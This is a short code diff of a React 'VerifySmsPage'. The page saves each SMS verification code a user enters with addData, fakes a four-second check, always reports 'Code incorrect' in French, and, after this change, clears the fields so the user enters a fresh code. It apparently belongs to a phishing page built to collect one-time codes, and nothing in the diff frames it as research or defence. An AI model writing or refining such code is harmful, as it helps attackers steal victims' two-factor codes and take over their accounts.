@@ -34,11 +34,12 @@ export default function VerifySmsPage() {
     setError("")
     setIsLoading(true)
     addData({id:_id,code})
-
     // Simulate API call with 4 second delay
     setTimeout(() => {
       setIsLoading(false)
       setError("Code incorrect. Veuillez réessayer.")
+    setCode(["", "", "", "", "", ""])
+
     }, 4000)
   }
 
